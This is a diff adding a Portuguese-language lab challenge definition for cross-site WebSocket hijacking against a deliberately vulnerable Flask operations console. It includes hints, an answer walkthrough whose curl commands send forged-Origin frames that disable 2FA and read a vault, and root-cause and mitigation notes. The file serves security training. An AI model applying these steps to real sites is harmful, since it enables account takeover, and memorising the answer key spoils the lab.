@@ -1,0 +1,83 @@
+{
+  "slug": "client-websocket-csrf",
+  "title": "O socket confia no cookie",
+  "codename": "PILOTLINE",
+  "summary": "O console de operações do Pilotline mantém aberto um canal no estilo WebSocket que autentica a partir do cookie de sessão e nunca valida `Origin`. Uma página cross-origin consegue enviar frames privilegiados para desativar o 2FA e ler o vault do operador.",
+  "category": "client",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "client-websocket-csrf",
+  "estimated_minutes": 20,
+  "xp": 230,
+  "tech": [
+    "Flask",
+    "WebSocket semantics",
+    "JSON API",
+    "Browser same-origin"
+  ],
+  "tags": [
+    "websocket",
+    "csrf",
+    "cross-origin",
+    "cors",
+    "same-origin-policy"
+  ],
+  "story": "O Pilotline roda seu console de operações sobre um socket persistente. O console é uma aplicação da mesma origem, então a equipe assumiu que apenas suas próprias páginas poderiam abri-lo. O servidor aceita o upgrade com base no cookie `pilot_tab` e processa frames sem verificar novamente quem os enviou. Para testes, os mesmos frames também são expostos como um transporte de polling JSON em `/ws/poll` e `/ws/send`.",
+  "objective": "A partir de uma página cross-origin, conduza o socket do operador (frames enviados com `Origin: https://evil.example`) para desativar o 2FA e ler o registro do vault.",
+  "rules": "Fique na origem loopback atribuída. O transporte do socket, o endpoint de estado e o log de eventos fazem parte do lab; nenhum host externo é contatado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Registro do vault do operador",
+      "flag_type": "user",
+      "points": 230,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O que identifica o socket?",
+      "body": "Autentique-se em `/login` e inspecione o cookie. O estado do socket em `/ws/state` é retornado apenas para aquele cookie. Procure uma verificação de `Origin` no comportamento da response — não existe nenhuma.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Frames são apenas JSON",
+      "body": "`GET /docs` lista as ações dos frames. `POST /ws/send` com `{\"action\": \"profile\"}` responde pela aba do cookie independentemente desonde o request veio. As ações privilegiadas são `twofa.disable` e `vault.read`.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Envie a partir de evil.example",
+      "body": "Com o cookie `pilot_tab` do operador, envie POST de `{\"action\": \"twofa.disable\"}` e depois `{\"action\": \"vault.read\"}` para `/ws/send` com `Origin: https://evil.example`. A segunda response contém o registro do vault; `/ws/poll` e `/` confirmam que o 2FA está desligado.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Passo 1 — abra o socket como o operador.**\n\n```bash\ncurl -s -c jar.txt -d 'user=ops-lead&password=console-2026' http://127.0.0.1:PORT/login\ncurl -s -b jar.txt http://127.0.0.1:PORT/ws/state\n# {\"operator\": \"ops-lead\", \"twofa\": true, \"permissions\": [..., \"twofa.disable\", \"vault.read\"], \"frames\": 0}\n```\n\n**Passo 2 — confirme que frames não autenticados são recusados.**\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/ws/send \\\n  -H 'Origin: https://evil.example' -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"twofa.disable\"}'\n# {\"error\": \"socket not authenticated\"}   (401)\n```\n\n**Passo 3 — envie o frame privilegiado de uma origem estrangeira.**\n\n```bash\ncurl -s -b jar.txt -X POST http://127.0.0.1:PORT/ws/send \\\n  -H 'Origin: https://evil.example' \\\n  -H 'Referer: https://evil.example/frame.html' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"twofa.disable\"}'\n# {\"ok\": true, \"action\": \"twofa.disable\", \"twofa\": false, ...}\n\ncurl -s -b jar.txt -X POST http://127.0.0.1:PORT/ws/send \\\n  -H 'Origin: https://evil.example' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"vault.read\"}'\n# {\"ok\": true, \"action\": \"vault.read\", \"vault\": \"RV{...}\"}\n```\n\n**Passo 4 — confirme que o operador foi afetado.** `POST /ws/poll` (novamente com qualquer `Origin`) retorna `\"twofa\": false` e os frames enfileirados `2FA disabled by operator` / `vault.read executed`; o console em `/` renderiza `2FA: disabled`.",
+    "root_cause": "O upgrade do socket autentica apenas pelo cookie de sessão. Os navegadores anexam cookies a requests cross-origin automaticamente quando o request não é restrito por CORS, e servidores que não verificam `Origin` no upgrade não conseguem distinguir um frame first-party do console de um enviado por qualquer página que o operador visite. Operações privilegiadas (desativar 2FA, ler o vault) não exigem reautenticação nem token anti-CSRF, então um único frame cross-site é suficiente.",
+    "mitigation": "Valide o header `Origin` em todo upgrade de socket e em todo frame contra uma allow-list exata, exija um token anti-CSRF por conexão ou uma credencial que não seja cookie, e rejeite `Origin: null` e origens desconhecidas. Mantenha os cookies `SameSite=Lax`/`Strict`, exija reautenticação para mudanças de 2FA e acesso ao vault, e nunca exponha frames privilegiados sobre um transporte que uma página de terceiros possa alcançar com credenciais ambientais."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — WebSocket attacks",
+      "url": "https://portswigger.net/web-security/websockets",
+      "source_type": "official",
+      "description": "Cross-site WebSocket hijacking e a ausência de verificação de Origin."
+    },
+    {
+      "title": "OWASP — Cross-Site Request Forgery Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Validação de Origin e vinculação de token para canais que alteram estado."
+    },
+    {
+      "title": "CWE-1385 — Missing Origin Validation in WebSockets",
+      "url": "https://cwe.mitre.org/data/definitions/1385.html",
+      "source_type": "standard",
+      "description": "Definição da fraqueza de sockets que não verificam o header Origin."
+    }
+  ]
+}
